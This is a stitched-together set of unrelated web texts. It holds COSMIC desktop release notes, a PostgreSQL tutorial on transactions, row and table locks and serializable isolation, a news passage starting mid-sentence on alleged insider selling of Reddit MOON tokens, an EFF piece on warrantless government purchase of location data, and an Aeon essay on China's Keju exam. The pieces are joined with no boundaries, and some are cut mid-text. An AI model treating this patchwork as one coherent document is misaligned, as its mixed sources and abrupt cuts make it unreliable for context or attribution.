  <p><strong>Support for modifier-only key bindings</strong></p><p>Modifier keys such as Ctrl, Shift, and Alt affect the actions taking place on a key press. Sometimes, though, pressing solely a modifier key can have the same effect; for example, the Super key activating the Launcher or the Alt key showing top bar buttons in Firefox. Support has been added for this, and at least one COSMIC team member is very happy to have their Launcher shortcut back!</p><p><strong>Pointer constraints protocol</strong></p><p>Support for <a target="_blank" rel="noopener" href="https://wayland.app/protocols/pointer-constraints-unstable-v1">pointer constraints</a>, such as confining it to a certain region or locking it in place, has been added. This is used alongside the <a target="_blank" rel="noopener" href="https://wayland.app/protocols/relative-pointer-unstable-v1">relative pointer</a> protocol in specialized cases, such as in gaming. Opening or navigating to a full-screen game hides the pointer from view and locks it in place, while mouse motions are tracked and translated to in-game actions.</p><p><strong>DMA-BUF screen capture support</strong></p><p>This buffer-sharing <a target="_blank" rel="noopener" href="https://docs.kernel.org/driver-api/dma-buf.html">tool</a> improves performance with tools like OBS. It enables devices in your system like the GPU to synchronize and share buffers with one another across multiple drivers.</p><p><strong>DRM leasing for VR device support</strong></p><p>Wayland relies on a subsystem (Direct Rendering Manager or DRM) to render games onto a display. But VR headsets, being a specialized, immersive display, perform the same functions themselves to provide a better experience. <a target="_blank" rel="noopener" href="https://github.com/pop-os/cosmic-comp/pull/191">DRM leasing</a>, now in cosmic-comp the COSMIC Wayland compositor, enables this by lending the system resources your headset requires to render and display the game image.</p><p><strong>UI development</strong></p><p>We’ve expanded our UI capabilities by adding a couple software pieces to further implement UX designs:</p>

  <p>Using a layout library tool called <a target="_blank" rel="noopener" href="https://github.com/DioxusLabs/taffy">Taffy</a>, we were able to implement a new grid layout widget. “This was one of the most important widgets to implement,” says COSMIC engineer Michael, “ because it will enable the creation of complex layouts with proper alignments using minimal code.”</p>

  <p>
    Posted on <time datetime="2022-03-29">Tuesday March 29, 2022</time>
    
  </p>

  <p>One thing I wish I had understood better earlier on in my experience with
PostgreSQL is how transactions and locks can be used together to provide
serializable logic.</p>
<p>An easy way to illustrate this is with a simple bank account system. Suppose we
create an <code>accounts</code> table and populate it like this:</p>
<div><pre><code data-lang="sql"><span>create</span><span> </span><span>table</span><span> </span><span>accounts</span><span> </span><span>(</span><span>
</span><span>  </span><span>name</span><span> </span><span>text</span><span> </span><span>primary</span><span> </span><span>key</span><span>,</span><span>
</span><span>  </span><span>balance</span><span> </span><span>int</span><span> </span><span>not</span><span> </span><span>null</span><span>
</span><span></span><span>);</span><span>
</span><span></span><span>insert</span><span> </span><span>into</span><span> </span><span>accounts</span><span> </span><span>(</span><span>name</span><span>,</span><span> </span><span>balance</span><span>)</span><span> </span><span>values</span><span> </span><span>(</span><span>'A'</span><span>,</span><span> </span><span>10</span><span>),</span><span> </span><span>(</span><span>'B'</span><span>,</span><span> </span><span>0</span><span>);</span><span>
</span></code></pre></div><p>Now we have two bank accounts, <code>A</code> with a balance of $10, and <code>B</code> with a balance
of $0.</p>
<p>In order to be a <em>useful</em> bank, we want to be able to move money from one
account to another. In pseudocode, the way to move money from one account to
another might look something like:</p>
<pre><code>function moveMoney(from, to, amount):
  # Start a transaction.
  txn = db.begin()
  # Update the balances.
  txn.execute('update accounts set balance = balance - $amount where name = $from')
  txn.execute('update accounts set balance = balance + $amount where name = $to')
  # Commit the transaction.
  txn.commit()
</code></pre><p>We use a transaction here to make sure that either both updates succeed, or both
updates fail. In other words, we want to avoid the situation where money is
deducted from <code>A</code> but never deposited to <code>B</code>.</p>
<p>There’s another situation that we might want to avoid in our bank too: we might
want a rule that account balances can never be negative. To enforce this rule,
we can update our <code>moveMoney</code> function:</p>
<pre><code>function moveMoney(from, to, amount):
  # Moving a negative amount of money from A to B is equivalent to moving the
  # corresponding positive amount from B to A.
  if amount &lt; 0:
    moveMoney(to, from, -1*amount)
    return

  # Start a transaction so that all of our queries/updates succeed or fail as a
  # unit.
  txn = db.begin()

  # Make sure the $from account has a balance of at least $amount.
  currBalance = txn.query('select balance from accounts where name = $from')
  if currBalance &lt; amount:
    txn.rollback()
    throw exception

  # Move the money as before.
  txn.execute('update accounts set balance = balance - $amount where name = $from')
  txn.execute('update accounts set balance = balance + $amount where name = $to')

  # Commit the transaction.
  txn.commit()
</code></pre><p>But there’s a problem with this! Using a transaction only ensures that all of
the writes succeed or fail together, it does <em>not</em> provide any guarantees that
all of the statements in the transaction execute “at the same time” (i.e. the
transactions are not <em>serializable</em>).</p>
<h2 id="preventing-concurrency-bugs">Preventing concurrency bugs</h2>
<p>Let’s simulate two different actors calling <code>moveMoney('A', 'B', 10)</code>
concurrently, again with <code>A</code> having an initial balance of $10 and <code>B</code> having $0:</p>
<table>
<thead>
<tr>
<th>Actor 1</th>
<th>Actor 2</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>begin</code></td>
<td></td>
</tr>
<tr>
<td><code>select balance from accounts where name = 'A'</code></td>
<td></td>
</tr>
<tr>
<td></td>
<td><code>begin</code></td>
</tr>
<tr>
<td></td>
<td><code>select balance from accounts where name = 'A'</code></td>
</tr>
<tr>
<td><code>update accounts set balance = balance - 10 where name = 'A'</code></td>
<td></td>
</tr>
<tr>
<td><code>update accounts set balance = balance + 10 where name = 'B'</code></td>
<td></td>
</tr>
<tr>
<td><code>commit</code></td>
<td></td>
</tr>
<tr>
<td></td>
<td><code>update accounts set balance = balance - 10 where name = 'A'</code></td>
</tr>
<tr>
<td></td>
<td><code>update accounts set balance = balance + 10 where name = 'B'</code></td>
</tr>
<tr>
<td></td>
<td><code>commit</code></td>
</tr>
</tbody>
</table>
<p>Now, if we check the account balances, we can see a problem:</p>
<pre><code>postgres=# select * from accounts ;
 name | balance
------+---------
 A    |     -10
 B    |      20
</code></pre><p>Both actors read the initial balance as $10, and therefore allowed the
operations to proceed. The transaction is ensuring that $10 is deducted from <code>A</code>
<em>if and only if</em> $10 is deposited into <code>B</code>, but two transactions can still be
reading and making decisions based on the same data concurrently.</p>
<p>(PostgreSQL by default does <em>not</em> allow two transactions to <em>write</em> the same
data concurrently; after Actor 1 updates <code>A</code>’s balance, Actor 2 isn’t able to
update <code>A</code>’s balance until after the first transaction is committed or rolled
back.)</p>
<h2 id="check-constraints"><code>check</code> constraints</h2>
<p>There are a few ways we can fix this. One way would be to add a check
constraint:</p>
<div><pre><code data-lang="sql"><span>alter</span><span> </span><span>table</span><span> </span><span>accounts</span><span> </span><span>add</span><span> </span><span>constraint</span><span> </span><span>nonnegative_balance</span><span> </span><span>check</span><span> </span><span>(</span><span>balance</span><span> </span><span>&gt;=</span><span> </span><span>0</span><span>);</span><span>
</span></code></pre></div><p>With this constraint, Actor 2’s <code>update</code> will fail because the constraint would
be violated. In fact, we would no longer even need to check the previous balance
in our application code at all, because the database itself would ensure no
account’s balance ever goes below zero.</p>
<h2 id="table-locks">Table locks</h2>
<p>Another approach would be to use a lock. Before we start reading or writing data
from the <code>accounts</code> table, we can use a lock to ensure that our transaction has
exclusive access to that table until we roll back or commit:</p>
<div><pre><code data-lang="diff"> begin;
<span>+lock table accounts;
</span><span></span> select balance from accounts where name = 'A';
 update accounts set balance = balance - 10 where name = 'A';
 update accounts set balance = balance + 10 where name = 'B';
 commit;
</code></pre></div><p>The <code>lock table accounts</code> statement will not finish until no other transactions
have any locks on the <code>accounts</code> table, and will prevent all other transactions
from accessing the <code>accounts</code> table until our transaction is committed or rolled
back.</p>
<h2 id="row-locks">Row locks</h2>
<p>Locking the entire accounts table is an effective way to prevent overdrawing an
account, but it also needlessly slows down our banking program. If someone is
trying to move money from <code>A</code> to <code>B</code> while someone else is trying to move money
from <code>B</code> to <code>C</code>, the second person’s transaction won’t be able to start until
the first transaction completes, even though they’re touching different
accounts.</p>
<p>Luckily, rather than acquiring a lock on the entire table, we can just acquire a
lock on the row that we’re deducting money from. To do this, we can use <code>for update</code> at the end of our <code>select</code> statement:</p>
<div><pre><code data-lang="sql"><span>select</span><span> </span><span>balance</span><span> </span><span>from</span><span> </span><span>accounts</span><span> </span><span>where</span><span> </span><span>name</span><span> </span><span>=</span><span> </span><span>'A'</span><span> </span><span>for</span><span> </span><span>update</span><span>;</span><span>
</span></code></pre></div><p>Now, other transactions won’t be able to read this row until our transaction is
committed or rolled back (<code>for update</code> can only be used inside a transaction).</p>
<h2 id="transaction-isolation-levels">Transaction isolation levels</h2>
<p>One other way to ensure that we don’t overdraw an account is to change the
isolation level of the transaction:</p>
<div><pre><code data-lang="sql"><span>begin</span><span> </span><span>transaction</span><span> </span><span>isolation</span><span> </span><span>level</span><span> </span><span>serializable</span><span>;</span><span>
</span><span></span><span>select</span><span> </span><span>balance</span><span> </span><span>from</span><span> </span><span>accounts</span><span> </span><span>where</span><span> </span><span>name</span><span> </span><span>=</span><span> </span><span>'A'</span><span>;</span><span>
</span><span></span><span>update</span><span> </span><span>accounts</span><span> </span><span>set</span><span> </span><span>balance</span><span> </span><span>=</span><span> </span><span>balance</span><span> </span><span>-</span><span> </span><span>10</span><span> </span><span>where</span><span> </span><span>name</span><span> </span><span>=</span><span> </span><span>'A'</span><span>;</span><span>
</span><span></span><span>update</span><span> </span><span>accounts</span><span> </span><span>set</span><span> </span><span>balance</span><span> </span><span>=</span><span> </span><span>balance</span><span> </span><span>+</span><span> </span><span>10</span><span> </span><span>where</span><span> </span><span>name</span><span> </span><span>=</span><span> </span><span>'B'</span><span>;</span><span>
</span><span></span><span>commit</span><span>;</span><span>
</span></code></pre></div><p>The PostgreSQL manual has <a href="https://www.postgresql.org/docs/12/sql-set-transaction.html">a good description of <code>serializable</code></a>:</p>
<blockquote>
<p>If a pattern of reads and writes among concurrent serializable transactions
would create a situation which could not have occurred for any serial
(one-at-a-time) execution of those transactions, one of them will be rolled
back with a <code>serialization_failure</code> error.</p>
</blockquote>
<p>Where a row or table lock would prevent a second transaction from reading the
balance until the previous transaction committed, with <code>isolation level serializable</code> the second transaction would immediately fail with an error
message: “could not serialize access due to concurrent update.”</p>
<p>There’s a good explanation of the “serializable” consistency model—and how it
differs from other models—<a href="https://jepsen.io/consistency">on the Jepsen site</a>.</p>

The announcement created controversy in the crypto community, with many calling it a rug-pull, as the price of the native token on different subreddits tanked after the news was revealed.&nbsp;</p><p>Each subreddit had its own native token. For example, the Moons (MOON) token was the native crypto asset of r/CryptoCurrency, while Bricks (BRICK) was for r/FortNiteBR. Users could spend these points on badges and exclusive items for their avatars. </p><p>At the time of the announcement, the moderators of most of the subreddits involved with the community points program claimed to be unaware of the decision. However, this is now being called into question as new on-chain data suggests that at least a couple of moderators holding Moons may have been linked to three wallets that dumped millions of the tokens shortly before the announcement.</p><p><strong><em>Related: </em></strong><a href="https://cointelegraph.com/news/reddit-community-tokens-soar-kraken-listing" data-amp="https://cointelegraph-com.cdn.ampproject.org/c/s/cointelegraph.com/news/reddit-community-tokens-soar-kraken-listing/amp"><strong><em>Reddit community tokens soar on Kraken listing</em></strong></a></p><p>On-chain analysts such as Pledditor were the first to draw attention to the actions of subreddit moderator u/Mcgillby. On-chain data reveals that this moderator transferred more than 100,000 MOON over two different transactions on the Arbitrum Nova blockchain, turning it into more than $23,000 in Ether (<a href="https://cointelegraph.com/ethereum-price">ETH</a>). The user subsequently deleted all earlier Reddit posts.</p><blockquote><div lang="en" dir="ltr"><p>.<a href="https://twitter.com/Reddit?ref_src=twsrc%5Etfw">@Reddit</a> admins told /r/CryptoCurrency moderators beforehand, and 3 moderators sold <a href="https://twitter.com/search?q=%24MOON&amp;src=ctag&amp;ref_src=twsrc%5Etfw">$MOON</a> tokens on insider information<a href="https://twitter.com/search?q=%24MOON&amp;src=ctag&amp;ref_src=twsrc%5Etfw">$MOON</a> price dropped -22% minutes before the announcement was posted</p><p>Here is a list of Reddit moderators acting on inside information BEFORE the announcement: <a href="https://t.co/xAh75hOVEa">pic.twitter.com/xAh75hOVEa</a></p></div>— Pledditor (@Pledditor) <a href="https://twitter.com/Pledditor/status/1714610041699930439?ref_src=twsrc%5Etfw">October 18, 2023</a></blockquote>

<p>In another incident, just 17 minutes before Reddit’s statement, moderator u/Rider_of_the_storm allegedly shifted 345,422 MOON, worth over $69,000 at the time, to an exchange address. The Reddit account in question has since been deactivated. According to Lookonchain, on-chain data showed that at least three of the administrators overseeing the cryptocurrency subreddit liquidated tokens some 20 to 30 minutes before the announcement went public. </p><blockquote><p lang="en" dir="ltr">1/ Three <a href="https://twitter.com/CCMOD_?ref_src=twsrc%5Etfw">@CCMOD_</a> moderators dumped <a href="https://twitter.com/search?q=%24MOON&amp;src=ctag&amp;ref_src=twsrc%5Etfw">$MOON</a> in advance via <a href="https://twitter.com/hashtag/inside?src=hash&amp;ref_src=twsrc%5Etfw">#inside</a> information from <a href="https://twitter.com/Reddit?ref_src=twsrc%5Etfw">@Reddit</a> admins. <a href="https://t.co/ucrPkh6siX">pic.twitter.com/ucrPkh6siX</a></p>— Lookonchain (@lookonchain) <a href="https://twitter.com/lookonchain/status/1714851956995555816?ref_src=twsrc%5Etfw">October 19, 2023</a></blockquote>

  <div><p><span>In the absence of comprehensive federal privacy </span><a href="https://www.eff.org/deeplinks/2019/06/effs-recommendations-consumer-data-privacy-laws"><span>legislation</span></a><span> in the United States, the </span><a href="https://www.eff.org/deeplinks/2019/01/guided-tour-data-facebook-uses-target-ads"><span>targeted</span></a> <a href="https://www.eff.org/wp/behind-the-one-way-mirror"><span>advertising</span></a> <a href="https://www.eff.org/deeplinks/2022/03/ban-online-behavioral-advertising"><span>industry</span></a><span>, fueled by personal information harvested from our cell phone applications, has run roughshod over our privacy. Worse, the boundaries between corporate surveillance and government surveillance are eroding. Unless your data is fully encrypted or stored locally by you, the government often can get it from a communications or computing company. <br></span></p>
<p><span>Traditionally, that required a court order. But increasingly, the government just buys it from data brokers who bought it from the adtech industry. <br></span></p>
<p><span>An investigation from the </span><a href="https://www.wsj.com/tech/cybersecurity/how-ads-on-your-phone-can-aid-government-surveillance-943bde04"><span>Wall Street Journal </span></a><span>identified a company called Near Intelligence that purchased data about individuals and their devices from brokers who usually sell to advertisers. The company had contracts with government contractors that passed this data along to federal military and intelligence agencies. The company says it purchased data on over a billion devices. The government, in turn, can buy access to geolocation data on all those devices, when generally they’d have to show probable cause and get a warrant to get that same data. <br></span></p>
<p><span>Many smartphone application developers, to make a quick buck, are all too eager to sell your data to the highest bidder–and that often includes the government. Courts should hold that the Fourth Amendment requires police to get a warrant before tracking a person this way, but unfortunately, this corporate-government surveillance partnership has mostly evaded judicial review. <br></span></p>
<p><span>With the click of a mouse, police can use such surveillance tools to see the devices of people who attended a protest, follow them home to where they sleep, and target them for more surveillance, harassment, and retribution. Police can also track people whose devices have been inside an immigration attorney’s office, a reproductive health clinic, or a mental health facility. Police could easily use this tool to watch a secret rendezvous between a journalist and their whistleblowing source. Not to mention that law enforcement officials have often</span><a href="https://slate.com/technology/2013/09/loveint-how-nsa-spies-snooped-on-girlfriends-lovers-and-first-dates.html"> <span>abused</span></a><span> surveillance technologies for</span><a href="https://www.kentucky.com/news/nation-world/national/article243605777.html"> <span>malicious personal reasons</span></a><span>.</span></p>
<p><span>This type of surveillance also makes people who live and work in heavily-policed areas more vulnerable to falling under police suspicion. If you happened to be next door to a pizza shop that got robbed, or took a coffee break near graffiti, police could easily see your device located near the crime and target you for more surveillance.</span></p>
<p><span>News about Near Intelligence comes just a year after an EFF investigation revealed </span><a href="https://www.eff.org/deeplinks/2022/06/what-fog-data-science-why-surveillance-company-so-dangerous"><span>Fog Data Science</span></a><span>, a previously unknown company that provides state and local law enforcement with easy and often warrantless access to the precise and continuous geolocation of hundreds of millions of unsuspecting Americans, collected through their smartphone apps and then aggregated by shadowy data brokers. <br></span></p>
<p><span>In light of the Journal’s recent expose, Congress must close this databroker loophole once and for all. The </span><a href="https://www.wyden.senate.gov/news/press-releases/wyden-paul-and-bipartisan-senators-reintroduce-the-fourth-amendment-is-not-for-sale-act"><span>Fourth Amendment is Not For Sale Act</span></a><span> is bipartisan, commonsense law that would ban the U.S. government from purchasing data it would otherwise need a warrant to acquire.&nbsp; Moreover, with the invasive surveillance law</span><a href="https://act.eff.org/action/tell-congress-absent-major-changes-702-should-not-be-renewed"><span> Section 702 of the Foreign Intelligence Surveillance Act set to expire in December 2023</span></a><span>, Congress has a chance to include a databroker limits in any bill that seeks to renew it. <br></span></p>
<p><span>Further, Congress and the states must enact </span><a href="https://www.eff.org/deeplinks/2019/06/effs-recommendations-consumer-data-privacy-laws"><span>comprehensive</span></a> <a href="https://www.eff.org/deeplinks/2022/07/federal-preemption-state-privacy-law-hurts-everyone"><span>consumer</span></a> <a href="https://www.eff.org/deeplinks/2019/01/you-should-have-right-sue-companies-violate-your-privacy"><span>data</span></a> <a href="https://www.eff.org/deeplinks/2022/04/stop-forced-arbitration-data-privacy-legislation"><span>privacy</span></a> <a href="https://www.eff.org/deeplinks/2023/03/eff-comments-ntia-privacy-and-civil-rights"><span>legislation</span></a><span>. If companies harvest less of our data, then there will be less data for the government to buy from those companies. <br></span></p>
<p><span>It’s up to us to keep agitating to prevent the government from continuing to buy information about us that it would otherwise need a warrant for.&nbsp;</span></p>

<div id="readability-page-1" class="page"><div><p>On 7 and 8 June 2023, close to <span>13 million</span> high-school students in China sat for the world’s most gruelling college entrance exam. ‘Imagine,’ wrote a Singapore journalist, ‘the SAT, ACT, and all of your AP tests rolled into two days. That’s <em>Gao Kao</em>, or “higher education exam”.’ In 2023, almost <span>2.6 million</span> applied to sit China’s civil service exam to compete for only 37,100 slots.</p>
<p><em>Gao Kao</em> and China’s civil service exam trace their origin to, and are modelled on, an ancient Chinese institution, <em>Keju</em>, the imperial civil service exam established by the Sui Dynasty (581-618). It can be translated as ‘subject recommendation’. Toward the end of its reign, the Qing dynasty (1644-1911) abolished it in 1905 as part of its effort to reform and modernise the Chinese system. Until then, <em>Keju</em> had been the principal recruitment route for imperial bureaucracy. <em>Keju</em> reached its apex during the Ming dynasty (1368-1644). All the prime ministers but one came through the <em>Keju</em> route and many of them were ranked at the very top in their exam cohort.</p>
<p><em>Keju</em> was sheer memorisation. Testing was based primarily on the Confucian classics. And there was a lot to memorise. There were some 400,000 characters and phrases in the Confucian classics, according to Benjamin Elman’s <a href="https://www.ucpress.edu/book/9780520215092/a-cultural-history-of-civil-examinations-in-late-imperial-china" target="_blank" rel="noreferrer noopener">book</a> <em>A Cultural History of Civil Examinations in Late Imperial China</em> (2000). Preparation for the <em>Keju</em> began early. Boys aged as young as three to five began to practise their memorisation drills. After the immediate environs of their families, <em>Keju</em> was their first exposure to the world. <em>Keju</em>, which was open only to the male gender, was fiercely competitive. Using figures provided by Elman, during the Ming dynasty, <span>1 million</span> regularly took the qualifying tests and, of these, eventually about 400 would make it to the final <em>Jinshi</em> round. Passing the first tier of <em>Keju</em>, known as the provincial exam, was a lot easier – working out to be <span>4 per</span> cent on average during the Ming. Still, this was more cut-throat than getting into Harvard in most years.</p>
<p><span>T</span>he prestige of <em>Keju</em> was such that even an emperor coveted its bona fides. According to a legend, an emperor in the late Tang dynasty (618-907) hung on the wall of an imperial palace a wooden tablet proudly displaying his <em>Keju</em> degree – only it was fake. The emperor had it made for himself. This credentialism pervades officialdom today. Many Chinese government officials claim PhD degrees – earned or otherwise – on their résumés.</p>
<p>Much of the academic literature focuses on the meritocracy of <em>Keju</em>. The path-breaking book in this genre is Ping-ti Ho’s <em>The</em> <em>Ladder of Success in Imperial China</em> (1962). One of his observations is eye catching: more than half of those who obtained the <em>Juren</em> degree were first generation: ie, none of their ancestors had ever attained a <em>Juren</em> status. (<em>Juren</em> was, at the time, the first degree granted in the three-tiered hierarchy of <em>Keju</em>.) More recent literature demonstrates the political effects of <em>Keju</em>. In 1905, the Qing dynasty <a href="https://www.econometricsociety.org/publications/econometrica/2016/03/01/elite-recruitment-and-political-stability-impact-abolition" target="_blank" rel="noreferrer noopener">abolished</a> <em>Keju</em>, dashing the aspirations of millions and sparking regional rebellions that eventually toppled China’s last imperial regime <span>in 1911.</span></p>
<p><em>Keju</em> cultivated and imposed the values of deference to authority and collectivism</p>
<p>The political dimension of <em>Keju</em> goes far beyond its meritocracy and its connection to the 1911 republican revolution. For an institution that had such deep penetration, both cross-sectionally in society and across time in history, <em>Keju</em> was all encompassing, laying claims to the time, effort and cognitive investment of a significant swathe of the male Chinese population. It was a state institution designed to augment the state’s own power and capabilities. Directly, the state monopolised the very best human capital; indirectly, the state deprived society of access to talent and pre-empted <em>organised</em> religion, commerce and the intelligentsia. <em>Keju</em> anchored Chinese autocracy.</p>
<figure><img alt="Many young Chinese people are pictured in a long line outside an examination centre in a commercial district" loading="lazy" width="2400" height="2400" decoding="async" data-nimg="1" srcset="https://aeon.co/_next/image?url=https%3A%2F%2Fd2e1bqvws99ptg.cloudfront.net%2Fuser_image_upload%2F2687%2F1-final-GettyImages-1309387268.jpg&amp;w=3840&amp;q=90 1x" src="https://aeon.co/_next/image?url=https%3A%2F%2Fd2e1bqvws99ptg.cloudfront.net%2Fuser_image_upload%2F2687%2F1-final-GettyImages-1309387268.jpg&amp;w=3840&amp;q=90"><figcaption><p>Candidates queue for the national civil service examination on 27 March 2021 in Taiyuan, Shanxi province, China.

<p>The impact of <em>Keju</em> is still felt today, not only in the form and practice of <em>Gao Kao</em> and the civil service exam but also because <em>Keju</em> incubated values and work ethics. Today, Chinese minds still bear its imprint. For one, <em>Keju</em> elevated the value of education and we see this effect today. A 2020 <a href="https://academic.oup.com/ej/article/130/631/2030/5819954" target="_blank" rel="noreferrer noopener">study</a> shows that, for every doubling of successful <em>Keju</em> candidates per 10,000 of the population in the Ming-Qing period, there was a <span>6.9 per</span> cent increase in years of schooling in 2010. The <em>Keju</em> exams loom as part of China’s human capital formation today, but they also cultivated and imposed the values of deference to authority and collectivism that the Chinese Communist Party has reaped richly for its rule and legitimacy.</p>
<p>But isn’t it the case that the West – Prussia, then the United Kingdom and the United States – all had their own civil service exams? How is it possible that a strong bureaucracy complemented rather than supplanted political and religious pluralisms in the West?</p>
<p><span>C</span>hina and the West bureaucratised under an entirely different sequential order and under different contextual conditions, and these differences entail substantial implications for the subsequent political development. The civil service in the West was not a single-platform institution in the way that <em>Keju</em> was. There was a military civil service, a civil service for foreign affairs, for forestry, etc, etc. Multiple platforms of bureaucratic recruitment competed with one another and, collectively, they competed with other channels of mobility, such as the political parties and commerce. In <span>the US,</span> the Pendleton Act of 1883 removed the power of Congress and the political parties to control civil service appointments. Before the <span>1883 Act,</span> federal appointees returned a portion of their salaries to the party that had appointed them. Civil service never replaced Congress or political parties <em>in toto</em>, as witnessed by the fact that Congress today wields enormous power over the bureaucracy, including the power of the purse that funds its operation.</p>
<p>Another difference – and this is a big one – is timing. In the 19th century, the US introduced bureaucracy when ‘[t]he two institutions of constraint, the rule of law and accountability, were the most highly developed,’ as Francis Fukuyama <a href="https://us.macmillan.com/books/9780374535629/politicalorderandpoliticaldecay" target="_blank" rel="noreferrer noopener">writes</a> in <em>Political Order and Political Decay</em> (2014). The state in <span>the US</span> and <span>the UK</span> was already ‘a Shackled Leviathan’, to use the words of Daron Acemoglu and James A Robinson in their influential <a href="https://www.penguinrandomhouse.com/books/555400/the-narrow-corridor-by-daron-acemoglu-and-james-a-robinson/" target="_blank" rel="noreferrer noopener">book</a>, <em>The Narrow Corridor</em> (2020). The sequential order ran from politics to bureaucracy, not as in China from bureaucracy to politics. In the West, society was vibrant long before the state ramped up its administrative capacity. The rule of law, the principle of accountability, and the powers of the legislature and the political parties were already firmly entrenched. Yes, the Leviathan was shackled by society, but different parts of the Leviathan shackled each other. Bureaucracy in the US formed and gained power only under a myriad of constraints and contending forces, rather than the socioeconomic <em>tabula rasa</em> that greeted the arrival of Chinese bureaucracy.</p>
<p>Vladimir Putin’s autocracy pales in comparison with that of China’s president Xi Jinping</p>
<p>The civil service in <span>the UK</span> and <span>the US</span> was ensconced in pluralistic societies that enjoyed a degree of religious freedom and a modicum of emergent electoral democracy. A world of competing forces and constraints attended the arrival of bureaucracy, even helped to create it. Government bureaucracy competed in some situations or complemented in others with church, universities, commerce and other social groups for human capital, legitimacy and resources. For political development, birth order really matters.</p>
<p>In his <a href="https://press.princeton.edu/books/paperback/9780691010731/strong-societies-and-weak-states" target="_blank" rel="noreferrer noopener">book</a> <em>Strong Societies and Weak States</em> (1988), Joel S Migdal identifies a common problem in the developing world – the struggle of the state to acquire autonomy and capabilities. China, through history and today, is exactly the opposite. The state dominates society. Vladimir Putin’s Russia is autocratic but his autocracy pales in comparison with that of China’s president Xi Jinping. Harassed and targeted by the state, opposition parties are still legal and tenuously legitimate in Russia and some of Putin’s critics command a sizeable following. Even the power to commit violence – war fighting – was outsourced to a private force, the mercenaries led by Yevgeny Prigozhin, an arrangement not even remotely conceivable in China.</p>

<p>Since 2013, against the increasingly dictatorial Xi, there have been two prominent critics of the president and both were dispensed with summarily. Unlike Putin who has to rely on extra-legal means to silence his critics, suggesting some formal constraints on him, Xi directed the full apparatus of the Chinese state after his critics. The Chinese court sentenced the businessman Ren Zhiqiang to <span>18 years</span> in prison, and Tsinghua University promptly fired Xu Zhangrun, a law professor who wrote an open letter criticising Xi. Standing forlornly by themselves, neither Ren nor Xu commanded any formal political organisations behind them. In 2022, the Chinese regime put almost <span>400 million</span> people under some sort of <span>COVID-19</span> lockdown, a feat that is unimaginable in any other country.</p>
<p><span>A</span>n ultimate autocracy is one that reigns without society. Society shackles the state in many ways. One is <em>ex ante:</em> it checks and balances the actions of the state. The other is <em>ex post</em>. A strong society provides an outside option to those inside the state. Sometimes, this is derisively described as ‘a revolving door’, but it may also have the positive function of checking the power of the state. State functionaries can object to state actions by voting with their feet, as many US civil servants did during the Donald Trump administration, and thereby drain the state of the valuable human capital it needs to function and operate. A strong society raises the opportunity costs for the state to recruit human capital but such a receptor function of society has never existed at scale in imperial China nor today, thanks – in large part, I would argue – to <em>Keju</em>.</p>
<p><em>Keju</em> was so precocious that it pre-empted and displaced an emergent society. Meritocracy empowered the Chinese state at a time when society was still at an embryonic stage. Massive resources and administrative manpower were poured into <em>Keju</em> such that it completely eclipsed all other channels of upward mobility that could have emerged. In that sense, the celebration by many of <em>Keju</em>’s meritocracy misses the bigger picture of Chinese history. It is a view of a tree rather than of a forest. The crowding-out effect of <em>Keju</em> is captured succinctly in a book from the late <span>19th century:</span></p>
<blockquote>Since the introduction of the examination system … scholars have forsaken their studies, peasants their ploughs, artisans their crafts, and merchants their trades; all have turned their attention to but one thing – government office. This is because the official has all the combined advantages of the four without requiring their necessary toil …</blockquote>
<p>This is the larger impact of <em>Keju</em>. Its impressive bureaucratic mobility demolished all other mobility channels and possibilities. <em>Keju</em> was an anti-mobility mobility channel. It packed all the upward mobility within one channel – that of the state. Society was crowded out, and over time, due to its deficient access to quality human capital, it atrophied. This is the root of the power of Chinese autocracy and, I would argue, it is a historical development that is unique to China and explains the awesome power of Chinese autocracy.</p>
<p>China has legions of intellectuals, but it is bereft of an intelligentsia</p>
<p>Take intellectuals as an example. <em>Keju</em> inculcated literacy and helped create a vibrant book readership. Book ownership was widespread as early as the Ming dynasty. ‘More books were available,’ <a href="https://www.hup.harvard.edu/catalog.php?isbn=9780674072534" target="_blank" rel="noreferrer noopener">writes</a> Timothy Brook in <em>The Troubled Empire</em> (2010), ‘and more people read and owned more books, in the late Ming than at any earlier time in history, anywhere in the world.’ Brook sums up the impressions of Jesuits visiting China: ‘More surprising, perhaps, is that complete illiterates may well have been a minority in the late Ming.’</p>
<p>But a striking fact is that no organised intelligentsia of any significant size and visibility ever emerged in imperial China. There were no Chinese equivalents of the Royal Society in Britain or the many learned societies in France. One that left a mark is the Donglin Academy, a private discussion forum founded in 1111 by intellectuals of the Song dynasty (960-1279). The academy lasted as long as its founders’ lifespan and vanished into obscurity after their expiry. It was revived in 1604 during the reign of the Wanli emperor (1573-1620), but it operated as a political rather than an intellectual force. The scholar-officials formed a Donglin Faction, later brutally put down by the powerful eunuchs of the Ming court. The grand total of the second life of the Donglin Academy is <span>21 years,</span> from 1604 to 1625.</p>
<p>The term ‘scholar official’ is of Chinese coinage and it is evocative of China’s lacuna of intellectuals as an <em>institutionalised establishment</em>. Compare that situation with Tsarist Russia, another autocracy. Russians coined the term ‘intelligentsia’ – intellectuals as a class – and Russian intellectuals have a long tradition of standing apart from and defining their identity as separate to the state. China has legions of intellectuals, but it is bereft of an intelligentsia.</p>
<p>Prior to <em>Keju</em> and even during the early centuries of <em>Keju</em>, China had a plurality of upward mobility. Within bureaucracy, officials were appointed through nepotism, family ties, heredity and recommendations. Commerce, while always curtailed, was a nascent force, promising to burst forward. The Song dynasty experienced a vibrant development of commerce and a market economy. Although Confucianism was always the first among equals, other ideologies, such as Legalism, Daoism and Buddhism, cohabitated with Confucianism and vied with one another for the Chinese population’s attention and adherence.</p>
<p>But these societal forces were too nascent and too embryonic by the time <em>Keju</em> arrived and matured. They had yet to acquire their own unique identity, significant organisation and autonomous agency. In imperial China, there never was a level playing field between state and society, and over nearly <span>1,500 years,</span> <em>Keju</em> further deprived the congenitally deficient society of its oxygen – human capital. Fukuyama is right to assert that the Chinese state was precocious, but it was precocious in a particular fashion: its precocity contrasted sharply with the immaturity of Chinese society.</p>
